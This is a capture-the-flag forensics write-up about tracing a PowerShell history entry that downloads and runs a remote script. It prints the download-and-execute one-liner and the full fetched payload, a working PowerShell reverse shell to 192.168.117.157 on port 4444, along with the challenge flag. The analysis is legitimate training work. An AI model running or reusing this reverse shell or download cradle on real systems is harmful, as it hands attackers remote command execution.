### LOCATE THE PAYLOAD

---

Medium | Forensics, IC | 75 points

---

### Description

The attackers seem to have gotten a foothold on our system. And executed some malicious code. We need to know what the code does.

---

### First Impressions

We are given four files,

- unlockthecity.json
- unlockthecity.zip
- unlockthecity.pcapng
- rockyou.txt

I decided to start by unzipping the zip folder. Inside seems to be multiple folders and files from a windows 10 machine. I ran some grep searches on the contents and got a hit for “hack” which shows a [https://evilai.challenge.hackazon.org/update.ps1](https://evilai.challenge.hackazon.org/update.ps1) link in the Users/unlockthecity/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt file.

This ConsoleHost file seems to be a log of commands run in powershell. The context of our URL in the file is echo IEX(New-Object Net.WebClient).DownloadString('[https://evilai.challenge.hackazon.org/update.ps1](https://evilai.challenge.hackazon.org/update.ps1)') | powershell -noprofile -

Googling seems to reveal that this command runs a script on a remote server and outputs its result to stdout. The command only works in my powershell by removing the pipe, when I do, I get this, our flag for part 1 of this challenge! 

```php
└─PS> echo IEX(New-Object Net.WebClient).DownloadString('https://evilai.challenge.hackazon.org/update.ps1%27)
IEX
$TCPClient = New-Object Net.Sockets.TCPClient('192.168.117.157', 4444);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()

# CTF{You_Found_The_EVIL_AI_Payload}
```
